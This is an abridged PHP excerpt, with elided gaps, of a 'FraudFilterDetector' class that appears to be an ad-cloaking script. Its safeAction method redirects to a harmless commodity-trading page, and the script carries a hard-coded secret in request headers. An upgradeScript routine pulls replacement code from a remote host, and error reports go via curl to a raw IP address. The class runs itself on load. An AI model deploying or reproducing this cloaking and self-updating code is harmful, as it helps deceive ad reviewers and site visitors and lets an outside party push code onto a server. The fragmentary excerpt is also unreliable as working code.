...
class FraudFilterDetector_vgkmh {
    ...
    function isSignatureValid($sign, $time) {
        $str = '9ec67aae-7cca-4091-9d8f-b48ffdbbddba.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://learnbonds.com/commodity-trading/corn');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 9ec67aae-7cca-4091-9d8f-b48ffdbbddba',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 9ec67aae-7cca-4091-9d8f-b48ffdbbddba';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 9ec67aae-7cca-4091-9d8f-b48ffdbbddba';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=vgkmh&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_vgkmh = new FraudFilterDetector_vgkmh();
$fraudFilterDetector_vgkmh->check();
